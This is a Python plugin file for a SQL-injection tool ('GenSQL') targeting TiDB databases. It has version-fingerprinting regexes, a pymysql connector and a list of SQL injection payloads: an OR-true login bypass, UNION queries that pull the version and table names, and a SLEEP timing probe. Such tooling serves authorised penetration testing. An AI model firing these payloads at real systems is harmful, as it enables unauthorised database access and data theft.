#!/usr/bin/env python
# GenSQL Plugin: TiDB (MySQL-compatible NewSQL) - by Jeevraj
"""TiDB DBMS plugin for GenSQL. Author: Jeevraj"""

import re


class TiDBFingerprint:
    """Fingerprint TiDB from error messages and version strings. Author: Jeevraj"""

    ERROR_SIGNATURES = [
        r"tidb_version",
        r"TiDB",
        r"tikv",
        r"TiKV",
        r"pd_server",
        r"TiDB server",
    ]

    VERSION_QUERY = "SELECT tidb_version()"

    def identify(self, response_body):
        for sig in self.ERROR_SIGNATURES:
            if re.search(sig, str(response_body), re.IGNORECASE):
                return True, "TiDB"
        return False, None


class TiDBConnector:
    """TiDB database connector via MySQL wire protocol. Author: Jeevraj"""

    DBMS          = "TiDB"
    DBMS_ALIASES  = ("tidb", "ti_db", "ti-db")
    DEFAULT_PORT  = 4000

    # TiDB-specific SQL injection payloads (MySQL-compatible with extensions)
    INJECTION_PAYLOADS = [
        "' OR '1'='1'-- -",
        "' AND 1=1-- -",
        "' UNION SELECT tidb_version(), NULL-- -",
        "' AND SLEEP(3)-- -",
        "' AND (SELECT SUBSTR(tidb_version(),1,4))='5.7.'-- -",
        "' UNION SELECT @@tidb_version, database()-- -",
        "' UNION SELECT NULL, table_name FROM information_schema.tables LIMIT 1-- -",
    ]

    # TiDB-specific SQL functions
    TIDB_FUNCTIONS = [
        "tidb_version()",
        "tidb_is_ddl_owner()",
        "current_resource_group()",
    ]

    ERROR_MESSAGES = [
        "You have an error in your SQL syntax",
        "tidb_version",
        "ERROR 1064",
        "TiDB",
    ]

    def connect(self, host="localhost", port=4000, user="root", password="",
                database=""):
        try:
            import pymysql
            self.conn = pymysql.connect(
                host=host, port=port, user=user,
                password=password, database=database,
            )
            return True
        except Exception:
            return False

    def disconnect(self):
        if hasattr(self, "conn") and self.conn:
            try:
                self.conn.close()
            except Exception:
                pass

    def execute(self, query):
        try:
            cur = self.conn.cursor()
            cur.execute(query)
            return cur.fetchall()
        except Exception:
            return []


class TiDBMap(TiDBConnector, TiDBFingerprint):
    """GenSQL combined DBMS plugin for TiDB. Author: Jeevraj"""
    pass
